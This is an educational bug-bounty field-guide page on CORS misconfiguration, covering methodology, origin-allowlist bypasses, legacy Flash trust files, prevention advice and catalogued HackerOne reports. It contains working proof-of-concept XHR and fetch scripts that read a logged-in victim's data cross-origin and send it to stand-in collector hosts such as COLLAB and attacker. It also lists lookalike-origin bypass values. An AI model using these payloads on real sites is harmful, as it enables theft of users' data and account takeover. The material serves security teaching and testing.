@@ -1,0 +1,510 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CORS Misconfiguration · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Attack surface</b><span class="sep">/</span><b>CORS Misconfiguration</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="on" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-high)"></span>Attack surface</div>
+      <h1>CORS Misconfiguration</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>22</b></span><a class="chip lab" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>CORS</b></a></div>
+    </header>
+    
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>CORS (Cross-Origin Resource Sharing) is the browser mechanism that <strong>relaxes</strong> the Same-Origin Policy so one origin can read another origin's responses. The server decides who is allowed: it echoes an <code>Access-Control-Allow-Origin</code> (ACAO) header, and — if it wants the cross-origin request to carry the victim's cookies — an <code>Access-Control-Allow-Credentials: true</code> (ACAC) header. Get that policy wrong and you hand any attacker page a <strong>credentialed, response-readable</strong> channel into a logged-in victim's session.</p>
+<p>The whole vulnerability lives in <strong>who the server trusts and how it checks it</strong>. The lethal combination is a <em>reflected specific origin</em> (or <code>null</code>) returned <strong>together with</strong> <code>ACAC: true</code>: that is Same-Origin Policy switched off for the endpoint. From an attacker-hosted page you then read the victim's PII, API tokens, and CSRF secrets, and pivot to account actions. Treat CORS as a <strong>cross-origin read primitive</strong> that chains into account takeover — not a header-audit nag.</p>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div><code>Access-Control-Allow-Origin: *</code> <strong>with</strong> credentials is inert — browsers forbid the wildcard alongside <code>ACAC: true</code>. The dangerous form is a <em>reflected exact origin</em> (or <code>null</code>) plus <code>ACAC: true</code>. Reflection <strong>without</strong> credentials only leaks data reachable without the victim's cookies — usually informative, not a finding.</div></div>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Find credentialed endpoints.</strong> Authenticated JSON/REST APIs that return PII (<code>/api/user</code>, <code>/profile</code>, <code>/api/rest/.../users/ID</code>), token/access-level endpoints, <code>wp-json</code>, and socket.io XHR-polling fallbacks.</li><li><strong>Fire one probe</strong> — replay the request with a foreign <code>Origin</code> header (keep the victim cookie) and read the response headers back.</li><li><strong>Look for the broken pair</strong>: your Origin reflected in <code>ACAO</code> <strong>and</strong> <code>ACAC: true</code>. That pair alone is exploitable.</li><li><strong>If exact reflection is blocked, walk the bypass ladder</strong> — <code>null</code>, suffix, substring, any-subdomain, <code>http://</code> downgrade (see the Bypasses table). Each rung is a different broken check.</li><li><strong>Confirm with a real read</strong> from an attacker origin (or the domain that satisfies the sloppy allowlist): <code>withCredentials</code> XHR/fetch, then exfiltrate <code>responseText</code>.</li><li><strong>Escalate the bytes</strong> — parse a CSRF/<code>authenticity_token</code> or API key out of the stolen response and drive a state-changing action.</li></ol>
+<div class="pre" data-lang="http"># The one probe — foreign Origin at a credentialed endpoint
+GET /api/user HTTP/1.1
+Host: TARGET
+Origin: https://evil.example
+Cookie: &lt;victim session&gt;
+
+# TELL (exploitable) — response contains BOTH:
+#   Access-Control-Allow-Origin: https://evil.example   &lt;- your Origin reflected
+#   Access-Control-Allow-Credentials: true              &lt;- credentials honored</div>
+<div class="pre" data-lang="bash"># Fast header sweep across a list of endpoints
+curl -s -I -H "Origin: https://evil.example" "https://TARGET/api/user" \
+  | grep -i 'access-control-allow-\(origin\|credentials\)'</div>
+<h2 class="sec" id="origin-trust-bypass-variants"><span class="tick">§</span>Origin-trust bypass variants</h2>
+<p>Find which check the server uses, then send the Origin that defeats it. All of these still require <code>ACAC: true</code> in the response to be worth reporting.</p>
+<h3 class="sub" id="reflected-origin-credentials">Reflected Origin + credentials</h3>
+<p>The baseline bug: the server copies the request <code>Origin</code> verbatim into <code>ACAO</code> and sets <code>ACAC: true</code> (Express <code>cors({origin: true})</code> does exactly this). Any origin passes — SOP is effectively off for the endpoint.</p>
+<div class="pre" data-lang="http">Origin: https://evil.example
+# server reflects:
+#   Access-Control-Allow-Origin: https://evil.example
+#   Access-Control-Allow-Credentials: true</div>
+<h3 class="sub" id="null-origin"><code>null</code> origin</h3>
+<p>Test on <strong>every</strong> target — a sandboxed iframe or a <code>data:</code>/<code>file:</code> URI sends <code>Origin: null</code>. If the server reflects <code>null</code> with credentials, you don't even need a registered domain: host the exploit inside a sandboxed frame.</p>
+<div class="pre" data-lang="html">&lt;iframe sandbox="allow-scripts"
+        srcdoc="&amp;lt;script&amp;gt;/* withCredentials fetch runs here as Origin: null */&amp;lt;/script&amp;gt;"&gt;
+&lt;/iframe&gt;</div>
+<h3 class="sub" id="sloppy-allowlist-matching-suffix-substring-regex">Sloppy allowlist matching (suffix / substring / regex)</h3>
+<p>The server <em>tries</em> to allowlist but matches badly. <code>endsWith('target.com')</code>, <code>Origin.contains('//target')</code>, or an unanchored regex all pass a lookalike you can <strong>register</strong>. Enumerate the family, register the one that matches, then run the standard PoC verbatim.</p>
+<div class="pre" data-lang="http">Origin: https://nottarget.com            # endsWith('target.com') — unanchored suffix, missing the leading dot
+Origin: https://target.com.evil.net      # startsWith('https://target.com') — unanchored prefix
+Origin: https://target.evil.net          # contains('//target') — the host sits right after the //
+Origin: https://eviltargetx.com          # contains('target') / unescaped-dot regex — bare substring match</div>
+<h3 class="sub" id="any-subdomain-reflection">Any-subdomain reflection</h3>
+<p>The check is "ends with <code>.target.com</code>" and reflects <em>any</em> subdomain. Combine with a subdomain takeover, a self-XSS on a sibling host, or a dangling CNAME to obtain a trusted origin.</p>
+<div class="pre" data-lang="http">Origin: https://attacker.target.com</div>
+<h3 class="sub" id="http-scheme-downgrade-mitm"><code>http://</code> scheme downgrade (MITM)</h3>
+<p>If the server reflects an <code>http://</code> origin, you no longer need an attacker-owned domain — a <strong>network MITM</strong> forges <code>Origin: http://www.target.com</code>, injects a page over cleartext, and reads the <code>https://</code> responses. Trust bug becomes a network-exfil primitive.</p>
+<div class="pre" data-lang="http">Origin: http://www.target.com
+#   -&gt; Access-Control-Allow-Origin: http://www.target.com
+#      Access-Control-Allow-Credentials: true</div>
+<h2 class="sec" id="exploitation"><span class="tick">§</span>Exploitation</h2>
+<p>Once a probe confirms the pair, prove impact with a credentialed read from the attacker origin. This is the canonical PoC — host it, lure a logged-in victim, exfiltrate the body.</p>
+<div class="pre" data-lang="html">&lt;script&gt;
+  // Read the victim's authenticated response cross-origin and exfil it
+  var x = new XMLHttpRequest();
+  x.open('GET', 'https://TARGET/api/user', true);
+  x.withCredentials = true;                              // sends the victim's cookies
+  x.onload = function () {
+    new Image().src = 'https://COLLAB/?d=' + btoa(x.responseText);
+  };
+  x.send();
+&lt;/script&gt;</div>
+<div class="pre" data-lang="js">// fetch equivalent — same primitive, cleaner exfil
+fetch('https://TARGET/api/user', {credentials: 'include'})
+  .then(r =&gt; r.text())
+  .then(d =&gt; navigator.sendBeacon('https://COLLAB/', d));</div>
+<div class="callout tip"><span class="ico">▸ TIP</span><div><code>alert(document.domain)</code> proves XSS; for CORS the proof is <strong>reading data you shouldn't</strong> from a <em>different</em> origin. Screenshot the victim's own email/id/token in the exfiltrated JSON — a reflected header with no read is often waved off as theoretical.</div></div>
+<h2 class="sec" id="legacy-cross-origin-trust-files"><span class="tick">§</span>Legacy cross-origin trust files</h2>
+<p>Before CORS, Flash and Silverlight granted cross-origin reads via policy files. They still ship on old assets and carry the same trust the ACAO logic does — audit them.</p>
+<ul><li><strong><code>/crossdomain.xml</code></strong> (Flash) — every <code>allow-access-from domain="…"</code> is part of your trust boundary. A wildcard <code>*.partner.com</code> plus a <strong>takeover-able</strong> subdomain lets an attacker host a SWF on the trusted host and read the target cross-origin; <code>allow-http-request-headers-from domain="*" headers="*"</code> makes it worse.</li><li><strong><code>/clientaccesspolicy.xml</code></strong> (Silverlight) — same idea; a wildcard <code>*</code> policy trusts everyone.</li><li><strong>Permissive CDN SWF</strong> — a whitelisted host serving a SWF with <code>Security.allowDomain('*')</code> <strong>and</strong> a URL param that loads external Flash lets an attacker SWF inherit the trusted origin's read access.</li><li><strong>JSONP callback</strong> — a callback reflected at the <strong>start</strong> of the response and filtered only to <code>[A-Za-z0-9]</code> can smuggle a whole DEFLATE-encoded SWF; Flash ignores the trailing JSON and executes it as the JSONP origin.</li></ul>
+<div class="pre" data-lang="html">&lt;!-- vulnerable crossdomain.xml pattern --&gt;
+&lt;!-- &lt;allow-access-from domain="*.partner.com"/&gt;  + takeover-able sub.partner.com --&gt;
+&lt;object type="application/x-shockwave-flash"
+        data="https://TARGET/jsonp-api?callback=__ALNUM_SWF__"&gt;
+  &lt;param name="AllowScriptAccess" value="always"&gt;
+&lt;/object&gt;
+&lt;!-- response: __ALNUM_SWF__({"api":"json"}) — Flash ignores the trailing bytes --&gt;</div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<p>Real allowlist/logic bypasses from the corpus, each tagged with the report it came from.</p>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td><code>endsWith('target.com')</code></td><td><code>nottarget.com</code> — an unanchored suffix matches a registerable domain</td><td>#168574</td></tr><tr><td><code>Origin.contains('//target')</code></td><td><code>niche.co.evil.net</code> satisfies the substring check</td><td>#426147</td></tr><tr><td>Substring / sloppy regex</td><td><code>developersxzomato.com</code> passes a regex/substring of the trusted host</td><td>#426165</td></tr><tr><td>Any-subdomain reflection</td><td>ACAO reflects any <code>*.target.com</code> origin — pair with subdomain takeover</td><td>#629892</td></tr><tr><td><code>http://</code> scheme allowed</td><td>reflects <code>http://</code> origin → network MITM forges the trusted origin</td><td>#629892</td></tr><tr><td>Verbatim reflection + <code>ACAC:true</code></td><td><code>Origin</code> echoed unchanged with credentials (SOP off)</td><td>#235200, #470298, #769058, #1183601, #2332728</td></tr><tr><td><code>null</code> origin</td><td>sandboxed iframe / <code>data:</code> URI yields <code>Origin: null</code>, reflected + creds</td><td>#235200</td></tr><tr><td><code>crossdomain.xml</code> wildcard</td><td><code>&lt;allow-access-from domain="*.partner.com"&gt;</code> + takeover-able sub</td><td>#244504</td></tr><tr><td><code>clientaccesspolicy.xml</code> wildcard</td><td>Silverlight policy trusts <code>*</code></td><td>#7571</td></tr><tr><td>Permissive CDN SWF</td><td>trusted host serves SWF with <code>allowDomain('*')</code> + external-loader param</td><td>#102234</td></tr><tr><td>JSONP callback charset</td><td>full alnum SWF smuggled through a <code>[A-Za-z0-9]</code>-filtered callback</td><td>#10373</td></tr><tr><td>Extension-origin trust</td><td>ACAO trusts <code>chrome-extension://</code> origins → rogue extension impersonates user</td><td>#412490</td></tr></tbody></table></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>A cross-origin read is a means, not the end. Escalate the stolen bytes:</p>
+<ul><li><strong>CORS read → CSRF-token theft → account takeover</strong> — the readable response carries the <code>authenticity_token</code>/CSRF token; use it to POST a state-changing action (change email → password reset → ATO). Highest-impact chain in the class (#426147).</li><li><strong>CORS read → API-token / access-level disclosure</strong> — pull the bearer/API token from the JSON body, then call the API directly, off-browser and off-cookie.</li><li><strong><code>http://</code> reflection → network MITM exfil</strong> — no attacker domain needed; a MITM forges the trusted origin and reads <code>https://</code> responses (#629892).</li><li><strong>Subdomain takeover → trust-file / any-subdomain bypass</strong> — seize a dangling <code>*.partner.com</code> or <code>*.target.com</code> host to obtain a trusted origin, then read cross-origin (#244504). Cross-check every allow-listed domain against subdomain-takeover.</li><li><strong>JSONP / SWF content confusion → SOP bypass</strong> — a legacy JSONP endpoint or permissive CDN SWF becomes a full same-origin read primitive (#10373, #102234).</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Static allowlist, never reflect.</strong> Compare <code>Origin</code> against an exact set and echo only a member of it. Reflecting the request Origin is the root cause of nearly every case here.</li><li><strong>Anchor the match.</strong> Full-origin equality, not <code>endsWith</code> / <code>contains</code> / regex. If subdomains are needed, match against a leading-dot <code>.target.com</code> <strong>and</strong> require <code>https://</code>.</li><li><strong>Never pair <code>ACAC:true</code> with a broad or reflected origin.</strong> If credentials aren't needed, drop <code>ACAC</code> entirely — then a <code>*</code> wildcard is browser-safe. Reflection without credentials on a non-sensitive endpoint is informative, not exploitable.</li><li><strong>Reject <code>null</code> and <code>http://</code>.</strong> <code>null</code> comes from sandboxed frames/<code>data:</code> URIs; <code>http://</code> enables MITM origin forgery.</li><li><strong>Retire legacy trust files.</strong> Remove <code>crossdomain.xml</code>/<code>clientaccesspolicy.xml</code> or scope them to <code>master-only</code>/self; audit every wildcard/partner domain for liveness and takeover. Serve JSONP from a sandbox domain and prefix responses so the first bytes aren't attacker-controlled.</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>Burp Suite</strong> — Repeater to flip the <code>Origin</code> header; the CORS scanner checks and <strong>Param Miner</strong> for header discovery.</li><li><strong><code>curl -H "Origin: ..."</code></strong> — fast header sweeps across an endpoint list.</li><li><strong>Browser DevTools</strong> — Network tab → response headers to eyeball ACAO/ACAC live.</li><li><strong>interactsh / a public collaborator</strong> — receive the exfiltrated response body.</li><li><strong>JPEXS / Flashbang</strong> — decompile candidate SWFs to confirm <code>allowDomain('*')</code> + external-loader params.</li><li><strong>A throwaway registerable lookalike domain</strong> — weaponize substring/suffix allowlist bypasses.</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>22</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-470298" style="--sv:var(--sev-high)" data-sev="3" data-votes="34" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Origin-reflecting CORS with credentials enables cross-origin data theft</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#470298</b> · deptofdefense · none · 34 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The API reflects the request Origin verbatim into Access-Control-Allow-Origin while also sending Access-Control-Allow-Credentials: true, so any attacker origin can read authenticated responses in a victim's browser.</p>
+<h4>Method</h4><ol><li>Send a request with Origin: exploit.com to the API</li><li>Confirm response echoes Access-Control-Allow-Origin: exploit.com + Allow-Credentials: true</li><li>Host a page that XHRs the endpoint withCredentials=true and exfiltrates the response</li></ol>
+<div class="pre">var x=new XMLHttpRequest();
+x.open('GET','https://TARGET/api/jsonws/.../get-content-by-slug/slug/page-ex-link',true);
+x.withCredentials=true;
+x.onload=function(){fetch('https://COLLAB/?d='+btoa(x.responseText))};
+x.send();</div>
+<p class="insight"><b>Insight —</b> Any endpoint that reflects Origin AND allows credentials is exploitable. Always test with a random Origin header; also test null origin and trusted-subdomain-substring bypasses.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/470298" target="_blank" rel="noopener">hackerone.com/reports/470298</a></span><a class="src" href="#report-470298" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-244504" style="--sv:var(--sev-high)" data-sev="3" data-votes="29" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Insecure crossdomain.xml + takeover of an allow-listed subdomain -&gt; SOP bypass</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#244504</b> · starbucks · awarded · 29 votes · resolved</div>
+<div class="taxo"><span>Program <b>starbucks</b></span><span>Surface <b>web</b></span><span>Chain <b>subdomain takeover -&gt; Flash SOP bypass -&gt; authenticate</b></span><span>Tag <b>cors</b></span><span>Tag <b>subdomain-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">crossdomain.xml (and allow-http-request-headers-from) trusts specific wildcarded partner domains (*.partner.com) instead of only self; if any allow-listed subdomain is takeover-able, an attacker hosts a Flash file there and makes authenticated, header-controlled, response-readable requests to the target.</p>
+<h4>Method</h4><ol><li>Fetch /crossdomain.xml and enumerate every non-self allow-access-from domain (especially *.wildcards).</li><li>Resolve each allowed subdomain and check for dangling-DNS/subdomain takeover.</li><li>Take over a trusted subdomain and host a SWF that reads target responses cross-origin (headers=* makes it worse).</li></ol>
+<div class="pre">&lt;!-- vulnerable crossdomain.xml pattern --&gt;
+&lt;allow-access-from domain="*.partner.com"/&gt;
+&lt;allow-http-request-headers-from domain="*" headers="*"/&gt;
+&lt;!-- attacker takes over sub.partner.com, hosts evil.swf there --&gt;</div>
+<p class="insight"><b>Insight —</b> Treat crossdomain.xml / clientaccesspolicy.xml allow-lists as an extension of your trust boundary: every wildcard and partner domain must be alive and owned. Always cross-check allow-listed domains against subdomain-takeover.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/244504" target="_blank" rel="noopener">hackerone.com/reports/244504</a></span><a class="src" href="#report-244504" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-426147" style="--sv:var(--sev-high)" data-sev="3" data-votes="29" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CORS ACAO reflection with credentials -&gt; account takeover</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#426147</b> · x · none · 29 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>api</b></span><span>Chain <b>CORS read -&gt; steal CSRF/authenticity_token -&gt; state-ch</b></span><span>Tag <b>cors</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Access-Control-Allow-Origin is reflected from the request Origin with Access-Control-Allow-Credentials: true, and origin validation only checks that the Origin string contains '//niche.co'. Attacker origins such as https://niche.co.evil.net therefore pass.</p>
+<h4>Method</h4><ol><li>Host a page on a domain containing the substring '//niche.co' (e.g. niche.co.evil.net)</li><li>From it, XHR GET the authenticated API endpoint with withCredentials=true</li><li>Read the cross-origin response (user data / tokens)</li><li>Exfiltrate to attacker server</li></ol>
+<div class="pre">var x=new XMLHttpRequest();x.open('GET','https://www.niche.co/api/v1/users/ID',true);x.withCredentials=true;x.onload=function(){/* send x.responseText to attacker */};x.send();</div>
+<p class="insight"><b>Insight —</b> When testing CORS, don't stop at exact-origin: try suffix/prefix/substring bypasses (evil.com after target, target.com.evil.net, http/ftp/file schemes). If ACAC is true, you can read authenticated data and pull CSRF tokens -&gt; full account actions.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/426147" target="_blank" rel="noopener">hackerone.com/reports/426147</a></span><a class="src" href="#report-426147" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1183601" style="--sv:var(--sev-high)" data-sev="3" data-votes="15" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Origin-reflecting CORS with credentials enables cross-origin data theft</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1183601</b> · upchieve · none · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>upchieve</b></span><span>Surface <b>api</b></span><span>Chain <b>CORS reflection -&gt; credentialed cross-origin read -&gt; P</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The API reflects the request Origin into Access-Control-Allow-Origin (and allows credentials), so a malicious page can issue a credentialed cross-origin request and read the authenticated response (e.g. /api/user PII).</p>
+<h4>Method</h4><ol><li>Send a request with a foreign Origin header and confirm it is reflected in access-control-allow-origin.</li><li>Host a page that XHR/fetches the sensitive endpoint with withCredentials=true.</li><li>When a logged-in victim visits, read the response (PII/account data) and exfiltrate it.</li></ol>
+<div class="pre">GET /api/user HTTP/1.1
+Host: app.upchieve.org
+Origin: evil.com
+--&gt; access-control-allow-origin: evil.com
+
+// attacker page:
+var req=new XMLHttpRequest();req.onload=()=&gt;fetch('//attacker/?d='+btoa(req.responseText));
+req.open('get','https://app.upchieve.org/api/user',true);req.withCredentials=true;req.send();</div>
+<p class="insight"><b>Insight —</b> Test CORS by sending Origin: evil.com and Origin: null; if it is reflected AND access-control-allow-credentials:true, it's a full read of authenticated data. Also test trusted-substring bugs (evil-app.com, app.com.evil.com). Fix = static allowlist, never reflect.</p>
